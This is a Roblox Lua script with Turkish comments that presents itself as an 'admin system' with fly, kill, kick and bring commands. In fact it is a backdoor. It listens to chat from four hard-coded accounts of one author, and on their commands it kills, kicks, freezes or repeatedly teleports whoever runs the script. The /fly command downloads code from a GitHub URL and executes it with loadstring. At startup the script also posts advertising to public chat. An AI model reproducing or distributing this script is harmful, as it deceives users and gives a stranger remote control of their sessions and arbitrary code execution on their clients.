--admin sistem fly/unfly/bring/kill/kick

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService") -- Döngüler için daha verimli
local LocalPlayer = Players.LocalPlayer

-- Yetkililer
local allowedUsers = {
    ["q692q"] = true,
    ["muhammet_bekir2004"] = true,
    ["HilalWare_Lua"] = true,
    ["Muhammet_bekir2003"] = true
}

-- Döngü kontrol değişkenleri
local loopKillActive = false
local loopBringActive = false

-- Yönetici etiketi
local function addAdminTag(player)
    local function onCharacterAdded(character)
        local head = character:WaitForChild("Head", 5)
        if head and not head:FindFirstChild("AdminTagGui") then
            local billboard = Instance.new("BillboardGui")
            billboard.Name = "AdminTagGui"
            billboard.Size = UDim2.new(0, 200, 0, 50)
            billboard.StudsOffset = Vector3.new(0, 2, 0)
            billboard.Adornee = head
            billboard.AlwaysOnTop = true
            billboard.Parent = head

            local textLabel = Instance.new("TextLabel")
            textLabel.Size = UDim2.new(1, 0, 1, 0)
            textLabel.BackgroundTransparency = 1
            textLabel.Text = "Yönetici"
            textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
            textLabel.TextStrokeTransparency = 0
            textLabel.TextScaled = true
            textLabel.Font = Enum.Font.GothamBold
            textLabel.Parent = billboard
        end
    end

    player.CharacterAdded:Connect(onCharacterAdded)
    if player.Character then
        onCharacterAdded(player.Character)
    end
end

-- Karakterin tüm parçalarını dondur / çöz
local function setAnchoredAllParts(char, anchored)
    for _, part in ipairs(char:GetDescendants()) do
        if part:IsA("BasePart") then
            part.Anchored = anchored
        end
    end
end

-- Genel sohbet mesajı gönderme fonksiyonu
local function sendMessage(message)
    ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
end

-- Komutlar
local function setupCommands(player)
    player.Chatted:Connect(function(message)
        message = string.lower(message)

        if not allowedUsers[player.Name] then
            return
        end

        local localChar = LocalPlayer.Character
        local localRoot = localChar and localChar:FindFirstChild("HumanoidRootPart")
        local localHumanoid = localChar and localChar:FindFirstChild("Humanoid")
        
        local adminChar = player.Character
        local adminRoot = adminChar and adminChar:FindFirstChild("HumanoidRootPart")

        -- Basit Komutlar
        if message == "/kill" then
            if localHumanoid then
                localHumanoid.Health = 0
                sendMessage("By HilalWare.Lua New Scripts")
            end
        elseif message == "/kick" then
            LocalPlayer:Kick("Yetkili tarafından oyundan atıldınız.")
            sendMessage("By HilalWare.Lua New Scripts")
        elseif message == "/freeze" then
            if localChar then
                setAnchoredAllParts(localChar, true)
                sendMessage("By HilalWare.Lua New Scripts")
            end
        elseif message == "/unfreeze" then
            if localChar then
                setAnchoredAllParts(localChar, false)
                sendMessage("By HilalWare.Lua New Scripts")
            end
        elseif message == "/bring" then
            if localRoot and adminRoot then
                localRoot.CFrame = adminRoot.CFrame + Vector3.new(0, 3, 0)
                sendMessage("By HilalWare.Lua New Scripts")
            end
        elseif message == "/fly" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/HilalWare-Official/HilalWare/refs/heads/main/fly" ))()
            sendMessage("By HilalWare.Lua New Scripts")
        elseif message == "/unfly" then
            if _G.FlyFunction and typeof(_G.FlyFunction) == "function" then
                _G.FlyFunction(false)
                sendMessage("By HilalWare.Lua New Scripts")
            end
            
        -- DÖNGÜSEL KOMUTLAR (DÜZELTİLMİŞ)
        elseif message == "/loopkill" then
            if localHumanoid then
                loopKillActive = true
                sendMessage("Loop Kill başlatıldı.")
                -- Döngüyü coroutine içinde başlatarak scriptin kilitlenmesini önle
                coroutine.wrap(function()
                    while loopKillActive and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") do
                        LocalPlayer.Character.Humanoid.Health = 0
                        wait(1)
                    end
                end)()
            end
        elseif message == "/unloopkill" then
            if loopKillActive then
                loopKillActive = false -- Sadece bayrağı indir, döngü kendi kendine duracak.
                sendMessage("Loop Kill durduruldu.")
            end
        elseif message == "/loopbring" then
            if localRoot and adminRoot then
                loopBringActive = true
                sendMessage("Loop Bring başlatıldı.")
                -- Döngüyü coroutine içinde başlat
                coroutine.wrap(function()
                    while loopBringActive and LocalPlayer.Character and player.Character do
                        if LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and player.Character:FindFirstChild("HumanoidRootPart") then
                            LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
                        end
                        RunService.Heartbeat:Wait() -- wait() yerine daha verimli bir bekleme
                    end
                end)()
            end
        elseif message == "/unloopbring" then
            if loopBringActive then
                loopBringActive = false -- Bayrağı indirerek döngüyü sonlandır.
                sendMessage("Loop Bring durduruldu.")
            end
        end
    end)
end

-- Ana Kurulum
Players.PlayerAdded:Connect(function(player)
    if allowedUsers[player.Name] then
        addAdminTag(player)
        setupCommands(player)
    end
end)

for _, player in ipairs(Players:GetPlayers()) do
    if allowedUsers[player.Name] then
        addAdminTag(player)
        setupCommands(player)
    end
end

-- Script çalıştığında mesajları gönder
wait(2)
sendMessage("HilalWare.Lua New Kodlar")
wait(0.5)
sendMessage("@hilalware_lua @q692q @Muhammet_bekir2003 @muhammet_bekir2004 tarafından (hepsi aynı kişi)")
